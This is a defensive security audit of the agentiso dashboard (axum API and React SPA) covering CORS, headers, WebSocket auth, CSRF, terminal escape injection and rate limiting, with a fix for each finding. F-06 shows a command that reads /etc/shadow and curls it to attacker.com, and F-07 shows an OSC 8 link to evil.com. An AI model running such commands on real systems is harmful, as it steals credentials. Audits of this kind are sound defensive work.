# Frontend Dashboard Security Audit

**Auditor**: sec-frontend
**Date**: 2026-02-24
**Scope**: Backend dashboard (axum REST + WebSocket), frontend React SPA, auth, XSS, CSRF, headers, transport

---

## Executive Summary

The agentiso frontend dashboard has a moderate security posture. The React framework provides inherent XSS protection for most rendering paths, and the backend uses structured JSON serialization (serde) that prevents injection in API responses. However, there are several significant findings around missing security headers, overly permissive CORS, unauthenticated WebSocket connections, and auth token handling that should be addressed before exposing the dashboard beyond localhost.

**Critical**: 1 | **High**: 4 | **Medium**: 5 | **Low**: 3 | **Info**: 3

---

## Findings

### F-01: CORS Permissive Policy (Critical)

**Severity**: Critical
**File**: `agentiso/src/dashboard/web/mod.rs:158`
**Category**: CORS Misconfiguration

**Description**: The dashboard router uses `CorsLayer::permissive()` which sets `Access-Control-Allow-Origin: *` and allows all methods, headers, and credentials. This means any website visited by a dashboard user can make authenticated cross-origin requests to the dashboard API.

**Exploit Scenario**: A user has the dashboard open with an admin token configured. They visit a malicious website which silently sends `fetch('http://localhost:7070/api/workspaces', { headers: { Authorization: 'Bearer <token>' } })` to enumerate workspaces, execute commands, or destroy VMs. While the browser won't send stored credentials automatically with `*` origin, if the token is intercepted via XSS (see F-06), the permissive CORS allows exfiltration from any origin.

**Code**:
```rust
// mod.rs:158
let app = Router::new()
    .nest("/api", api)
    .layer(CorsLayer::permissive()); // DANGEROUS
```

**Recommendation**: Replace with restrictive CORS that only allows the dashboard's own origin:
```rust
use tower_http::cors::{CorsLayer, AllowOrigin};
use axum::http::{HeaderValue, Method};

let cors = CorsLayer::new()
    .allow_origin(AllowOrigin::exact(
        HeaderValue::from_str(&format!("http://{}:{}", bind_addr, port)).unwrap()
    ))
    .allow_methods([Method::GET, Method::POST, Method::PUT, Method::DELETE])
    .allow_headers([axum::http::header::CONTENT_TYPE, axum::http::header::AUTHORIZATION]);
```

---

### F-02: No Security Headers on Any Response (High)

**Severity**: High
**Files**: `agentiso/src/dashboard/web/mod.rs`, `agentiso/src/dashboard/web/embedded.rs`
**Category**: Missing Security Headers

**Description**: The dashboard serves responses without any of the standard browser security headers. This leaves the application vulnerable to clickjacking, MIME sniffing, and lacks any Content Security Policy.

Missing headers:
- `Content-Security-Policy` (CSP) -- no restriction on script sources, inline styles, etc.
- `X-Frame-Options` -- allows embedding in iframes (clickjacking)
- `X-Content-Type-Options` -- allows MIME sniffing
- `Strict-Transport-Security` (HSTS) -- no transport security enforcement
- `X-XSS-Protection` -- legacy but still useful for older browsers
- `Referrer-Policy` -- no control over referrer leakage
- `Permissions-Policy` -- no restriction on browser features

**Exploit Scenario**: An attacker embeds the dashboard in an invisible iframe on a malicious page and tricks the user into clicking on it (clickjacking), potentially triggering destructive actions like workspace destruction.

**Recommendation**: Add a security headers middleware layer:
```rust
use axum::middleware;
use axum::http::header;

async fn security_headers(request: Request, next: Next) -> Response {
    let mut response = next.run(request).await;
    let headers = response.headers_mut();
    headers.insert("X-Frame-Options", "DENY".parse().unwrap());
    headers.insert("X-Content-Type-Options", "nosniff".parse().unwrap());
    headers.insert("Referrer-Policy", "strict-origin-when-cross-origin".parse().unwrap());
    headers.insert("Permissions-Policy", "camera=(), microphone=(), geolocation=()".parse().unwrap());
    // CSP: allow self for scripts/styles, block inline except hashes, block frame-ancestors
    headers.insert(
        header::CONTENT_SECURITY_POLICY,
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; \
         frame-ancestors 'none'; connect-src 'self' ws: wss:; img-src 'self' data:".parse().unwrap()
    );
    response
}
```

---

### F-03: WebSocket Endpoint Has No Authentication (High)

**Severity**: High
**File**: `agentiso/src/dashboard/web/ws.rs:118-123`
**Category**: Authentication Bypass

**Description**: The WebSocket upgrade endpoint (`/api/ws`) goes through the `auth_middleware` layer, but the auth middleware skips authentication when `admin_token` is empty (the default configuration). Even when a token is configured, the WebSocket client (`frontend/src/api/websocket.ts`) does not send any authentication token in the WebSocket handshake.

The `WebSocketManager` constructor builds the URL as:
```typescript
// websocket.ts:14-15
const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
this.url = `${proto}//${window.location.host}/api/ws`;
```

No `Authorization` header or token query parameter is included. The browser WebSocket API does not support custom headers, so the Bearer token from `ApiClient` cannot be sent.

**Exploit Scenario**: When `admin_token` is configured, the REST API is protected, but the WebSocket endpoint effectively bypasses auth because the frontend WebSocket client sends no credentials. An attacker can connect to the WebSocket and subscribe to all topics to receive real-time workspace state changes, team information, and system events.

**Recommendation**: Implement WebSocket authentication via one of:
1. **Token in query parameter**: `ws://host/api/ws?token=<admin_token>` with server-side validation before upgrade
2. **Cookie-based auth**: Set an HttpOnly cookie on successful REST auth, validate it during WebSocket upgrade
3. **First-message auth**: Require the first WebSocket message to be an auth message with the token before subscribing

Option 1 is simplest:
```rust
#[derive(Deserialize)]
struct WsQuery { token: Option<String> }

async fn ws_upgrade(
    State(state): State<Arc<DashboardState>>,
    Query(query): Query<WsQuery>,
    ws: WebSocketUpgrade,
) -> Response {
    let admin_token = &state.config.dashboard.admin_token;
    if !admin_token.is_empty() {
        match &query.token {
            Some(t) if t == admin_token => {},
            _ => return super::error_response(StatusCode::UNAUTHORIZED, "UNAUTHORIZED", "missing ws token"),
        }
    }
    ws.on_upgrade(move |socket| handle_ws(socket, state))
}
```

---

### F-04: Auth Token Stored in Memory Without Persistence Protection (High)

**Severity**: High
**File**: `frontend/src/api/client.ts:6-10`
**Category**: Token Management

**Description**: The API client stores the admin token in a plain JavaScript variable (`this.token`). While this is better than localStorage (which persists across sessions and is accessible to any JS on the page), there is no mechanism to:
1. Clear the token on tab close or navigation away
2. Set a token expiry/rotation
3. Prevent the token from being extracted via browser dev tools

However, examining the codebase, the auth token does not appear to be set anywhere in the frontend code -- there is no login page or token input UI. The `api.setToken()` method exists but is never called in the application flow, meaning:
- When `admin_token` is empty (default), no auth is used at all
- When `admin_token` is configured, the frontend has no way to authenticate

**Exploit Scenario**: If `admin_token` is configured, the dashboard is completely non-functional since the frontend never sends the token. If not configured, all endpoints are unauthenticated. This means the dashboard always runs unauthenticated in practice.

**Recommendation**:
1. Add a login page that prompts for the admin token and stores it in the API client
2. Consider using HttpOnly cookies set by a server-side `/api/auth/login` endpoint instead of Bearer tokens, which provides automatic CSRF protection when combined with SameSite cookies and eliminates client-side token handling

---

### F-05: XSS Protection via React is Adequate but Relies on Correct Usage (Medium)

**Severity**: Medium (defense-in-depth concern)
**Files**: Multiple frontend components
**Category**: Cross-Site Scripting

**Description**: React's JSX automatically escapes content rendered via `{}` expressions, providing strong default XSS protection. The following attack surfaces were analyzed:

**Workspace names** (Card.tsx:249, TableView.tsx:287):
```tsx
<span className="text-sm font-semibold text-[#DCD5CC] truncate">{workspace.name}</span>
```
React escapes this. **Safe**.

**Team messages** (TeamChat.tsx:202):
```tsx
<div className="text-[#DCD5CC]/85 leading-relaxed">{msg.content}</div>
```
React escapes this. **Safe**.

**Task titles** (Card.tsx:392):
```tsx
<div className="text-sm font-medium text-[#DCD5CC] leading-tight flex-1 truncate">{task.title}</div>
```
React escapes this. **Safe**.

**Vault content** (NoteEditor.tsx): Uses Tiptap with Markdown extension configured as:
```tsx
Markdown.configure({
    html: false,  // HTML rendering DISABLED -- safe
    transformPastedText: true,
    transformCopiedText: true,
})
```
The `html: false` setting prevents raw HTML from being rendered in vault notes. **Safe**.

**However**, the following warrants attention:

1. **`dangerouslySetInnerHTML`**: Not used anywhere in the codebase. **Good**.
2. **Inline `<style>` tag** in NoteEditor.tsx:175-332: Uses a template literal within JSX `<style>` tag. The CSS content is hardcoded and does not interpolate user data. **Safe but fragile** -- future changes that interpolate user values here could introduce CSS injection.
3. **Tiptap Link extension** (NoteEditor.tsx:102-108): Configured with `openOnClick: false` and static `HTMLAttributes`. Links in vault notes are rendered as `<a>` elements. Tiptap's Link extension validates URLs by default (blocks `javascript:` URLs). **Safe**.

**Recommendation**:
- Add a Content Security Policy header (see F-02) as defense-in-depth
- Consider adding `style-src 'nonce-...'` in CSP instead of `'unsafe-inline'` if the inline `<style>` block in NoteEditor can be refactored to an external CSS file

---

### F-06: No CSRF Protection on State-Changing Endpoints (Medium)

**Severity**: Medium
**Files**: `agentiso/src/dashboard/web/workspaces.rs`, `teams.rs`, `vault.rs`, `batch.rs`
**Category**: Cross-Site Request Forgery

**Description**: All state-changing endpoints (POST, PUT, DELETE) rely solely on the Bearer token for authentication. There are no CSRF tokens, `SameSite` cookie attributes, or `Origin` header validation. Combined with the permissive CORS policy (F-01), this creates a CSRF attack surface.

Vulnerable endpoints include:
- `POST /api/workspaces` -- create workspace
- `DELETE /api/workspaces/{id}` -- destroy workspace
- `POST /api/workspaces/{id}/exec` -- execute arbitrary commands
- `POST /api/teams` -- create team
- `POST /api/vault/notes/{path}` -- write vault content
- `POST /api/batch/exec-parallel` -- parallel command execution

**Exploit Scenario**: With the default config (no admin_token), any website can issue state-changing requests to the dashboard. An attacker's page could:
```javascript
fetch('http://localhost:7070/api/workspaces/my-ws/exec', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: 'curl attacker.com/exfil?data=$(cat /etc/shadow)' })
});
```

**Recommendation**:
1. Fix CORS first (F-01) -- this alone blocks most CSRF via preflight checks
2. Add `Origin` header validation middleware for non-GET requests
3. Consider cookie-based auth with `SameSite=Strict`

---

### F-07: Terminal Escape Sequence Injection via Command Output (Medium)

**Severity**: Medium
**File**: `frontend/src/components/terminal/TerminalPane.tsx:301-313`, `frontend/src/stores/terminals.ts:138-159`
**Category**: Terminal Injection

**Description**: The terminal renders command output directly through xterm.js, which interprets ANSI escape sequences. While xterm.js is designed to handle escape sequences safely (no script execution), a malicious command output from a VM could:

1. **Overwrite visible terminal content**: Using cursor movement sequences (`\x1b[H`, `\x1b[2J`) to clear the screen and display fake prompts
2. **Set the terminal title**: `\x1b]0;malicious title\x07` to change the browser tab title (xterm.js `allowProposedApi: true` enables this)
3. **Hyperlink injection**: OSC 8 hyperlinks (`\x1b]8;;http://evil.com\x07Click here\x1b]8;;\x07`) could trick users into clicking malicious links

The SSE streaming path writes raw output to the terminal:
```typescript
case 'stdout':
    get().appendOutput(id, event.data);
    break;
```

And the terminal renders it directly:
```typescript
xtermRef.current.write(newText);
```

**Exploit Scenario**: A malicious process running in a VM outputs escape sequences that make the terminal display a fake "Enter your API key:" prompt, and the user types their credentials which are captured by a subsequent command.

**Recommendation**:
- Set `allowProposedApi: false` in the Terminal constructor to disable title-setting
- Consider sanitizing OSC sequences (especially OSC 8 hyperlinks) from command output before writing to xterm
- Document that terminal output from VMs is untrusted (defense-in-depth note for operators)

---

### F-08: SSE Exec Streaming Has No Cancellation-Side Auth (Medium)

**Severity**: Medium
**File**: `agentiso/src/dashboard/web/workspaces.rs:1109-1196`
**Category**: Streaming Security

**Description**: The SSE exec streaming endpoint (`POST /api/workspaces/{id}/exec/stream`) starts a background job and then streams its output as SSE events. The initial request goes through auth middleware, but the SSE connection remains open indefinitely. There is no mechanism to:

1. Validate that the SSE consumer is still the same authenticated principal
2. Limit the streaming duration
3. Rate-limit SSE connections per client

The SSE loop polls every 100ms and runs until the job completes:
```rust
loop {
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    let poll_result = wm.exec_poll(uuid, job_id).await;
    // ...
}
```

**Exploit Scenario**: An attacker could open many SSE connections to long-running exec commands, consuming server resources (each connection holds a tokio task and polls the workspace manager every 100ms).

**Recommendation**:
- Add a maximum SSE connection duration (e.g., 30 minutes)
- Rate-limit SSE connections per source IP
- Consider adding a streaming-specific keepalive timeout

---

### F-09: Embedded Static Files Path Traversal is Safe (Medium -- Verified Safe)

**Severity**: Info (no vulnerability found)
**File**: `agentiso/src/dashboard/web/embedded.rs:16-29`
**Category**: Path Traversal

**Description**: The embedded file server uses `rust-embed` which compiles assets into the binary at build time. The `DashboardAssets::get(path)` function performs an exact match against the compiled-in file listing -- it does not perform filesystem access at runtime. Path traversal sequences like `../../etc/passwd` simply don't match any embedded entry and fall through to the `index.html` SPA fallback.

However, when `static_dir` is configured (mod.rs:162-167):
```rust
if !static_dir.is_empty() && std::path::Path::new(static_dir).is_dir() {
    let serve_dir = tower_http::services::ServeDir::new(static_dir)
        .fallback(tower_http::services::ServeFile::new(
            format!("{}/index.html", static_dir),
        ));
    app.fallback_service(serve_dir)
}
```

`tower_http::services::ServeDir` handles path traversal protection internally (it canonicalizes paths and ensures they stay within the configured directory). **Safe**.

**Recommendation**: No action needed for embedded mode. For `static_dir` mode, verify that `tower-http` version handles symlink traversal (current versions do).

---

### F-10: Workspace Name in Error Messages Could Leak to Cross-Origin (Low)

**Severity**: Low
**File**: `agentiso/src/dashboard/web/mod.rs:124-131`
**Category**: Information Disclosure

**Description**: Error responses include user-provided workspace names:
```rust
format!(
    "workspace '{}' not found: not a valid UUID and no workspace with that name exists",
    id_or_name
)
```

With permissive CORS (F-01), these error messages are readable from cross-origin requests, allowing attackers to probe for workspace names.

**Recommendation**: After fixing CORS (F-01), this becomes low-risk. Additionally, consider using generic error messages that don't echo back user input.

---

### F-11: localStorage Usage for Non-Sensitive Data is Acceptable (Low)

**Severity**: Low
**Files**: `frontend/src/stores/ui.ts:91-98`, `frontend/src/stores/terminals.ts:46-60`, `frontend/src/components/terminal/TerminalPane.tsx:43-58`
**Category**: Client-Side Storage

**Description**: The following data is stored in localStorage:
- Custom board configurations (`agentiso-custom-boards`)
- Terminal command history per workspace (`agentiso-terminal-history:*`)
- Terminal font size preference (`agentiso-terminal-font-size`)

None of these contain secrets, auth tokens, or sensitive data. Command history could potentially contain sensitive commands typed by users, but this is standard terminal behavior.

**Recommendation**:
- Consider clearing terminal history on session end or providing a "clear history" option
- Document that command history is stored in localStorage in privacy-conscious environments

---

### F-12: Config Endpoint Leaks Infrastructure Details (Low)

**Severity**: Low
**File**: `agentiso/src/dashboard/web/system.rs:49-93`
**Category**: Information Disclosure

**Description**: The `/api/system/config` endpoint returns internal infrastructure configuration including:
- ZFS pool name and dataset prefix
- Bridge name and gateway IP
- Subnet configuration
- Resource limits
- Pool configuration

The admin_token is intentionally omitted (line 91), which is good. But the remaining information aids attacker reconnaissance.

**Recommendation**:
- Restrict this endpoint to authenticated users only (already behind auth middleware, but see F-04 about auth being effectively disabled)
- Consider reducing the information returned or making it opt-in via a query parameter

---

### F-13: Vault Search Query Used as Regex Without Sanitization (Info)

**Severity**: Info
**File**: `agentiso/src/dashboard/web/vault.rs:165-167`
**Category**: ReDoS

**Description**: The vault search endpoint passes the query string directly to the VaultManager's search function. If the VaultManager uses the query as a regex (which it does according to CLAUDE.md: "regex search"), a malicious query like `(a+)+$` could cause catastrophic backtracking (ReDoS).

**Recommendation**: The VaultManager should validate/limit regex complexity or use a regex engine with backtracking limits (e.g., `regex` crate in Rust has built-in complexity limits). Verify the `regex` crate's default size limits are adequate.

---

### F-14: No Rate Limiting on Dashboard REST Endpoints (Info)

**Severity**: Info
**File**: `agentiso/src/dashboard/web/mod.rs`
**Category**: Denial of Service

**Description**: While the MCP interface has rate limiting (`create 5/min, exec 60/min, default 120/min`), the dashboard REST API has no rate limiting. All dashboard endpoints bypass the MCP rate limiter since they directly call workspace manager methods.

**Recommendation**: Add rate limiting middleware to the dashboard API router, or reuse the existing rate limiting infrastructure. At minimum, rate-limit create/destroy/exec endpoints.

---

### F-15: Batch Exec-Parallel Has No Workspace Count Limit (Info)

**Severity**: Info
**File**: `agentiso/src/dashboard/web/batch.rs:42-93`
**Category**: Resource Exhaustion

**Description**: The `exec_parallel` endpoint accepts an unbounded list of workspace IDs and spawns a tokio task for each one:
```rust
for uuid in uuids {
    let wm = state.workspace_manager.clone();
    let cmd = req.command.clone();
    handles.push(tokio::spawn(async move { ... }));
}
```

A malicious request with thousands of workspace IDs would spawn thousands of concurrent tasks.

**Recommendation**: Add a maximum workspace count limit (e.g., `min(req.workspace_ids.len(), 50)`) and reject requests exceeding it.

---

### F-16: Tiptap Editor HTML Rendering Disabled -- Good (Info -- Positive Finding)

**Severity**: Info (positive)
**File**: `frontend/src/components/vault/NoteEditor.tsx:117`
**Category**: XSS Prevention

**Description**: The Tiptap Markdown extension is configured with `html: false`, which means raw HTML in vault notes is not rendered. This prevents stored XSS through vault note content. This is a good security decision.

---

## Summary Table

| ID | Severity | Category | Finding |
|----|----------|----------|---------|
| F-01 | Critical | CORS | `CorsLayer::permissive()` allows any origin |
| F-02 | High | Headers | No CSP, X-Frame-Options, X-Content-Type-Options |
| F-03 | High | Auth | WebSocket endpoint has no authentication |
| F-04 | High | Auth | Admin token auth is never used by frontend |
| F-06 | Medium | CSRF | No CSRF protection on state-changing endpoints |
| F-05 | Medium | XSS | React provides adequate protection (defense-in-depth review) |
| F-07 | Medium | Terminal | Escape sequence injection via VM command output |
| F-08 | Medium | Streaming | SSE exec streaming lacks connection limits |
| F-13 | Info | ReDoS | Vault search regex not validated |
| F-09 | Info | Path Traversal | Embedded static serving is safe (verified) |
| F-10 | Low | Info Disclosure | Workspace name echoed in error messages |
| F-11 | Low | Storage | localStorage used for non-sensitive preferences |
| F-12 | Low | Info Disclosure | Config endpoint leaks infrastructure details |
| F-14 | Info | DoS | No rate limiting on dashboard REST endpoints |
| F-15 | Info | DoS | Batch exec-parallel has no workspace count limit |
| F-16 | Info | XSS (positive) | Tiptap HTML rendering correctly disabled |

## Priority Fix Order

1. **F-01** (Critical): Replace `CorsLayer::permissive()` with restrictive policy -- immediate
2. **F-02** (High): Add security headers middleware -- immediate
3. **F-03** (High): Add WebSocket authentication -- before any non-localhost deployment
4. **F-04** (High): Implement login flow or cookie-based auth -- before any non-localhost deployment
5. **F-06** (Medium): CSRF protection (mostly resolved by fixing F-01)
6. **F-07** (Medium): Disable `allowProposedApi` in xterm.js
7. **F-08** (Medium): Add SSE connection limits
8. **F-14/F-15** (Info): Rate limiting + batch limits -- hardening pass
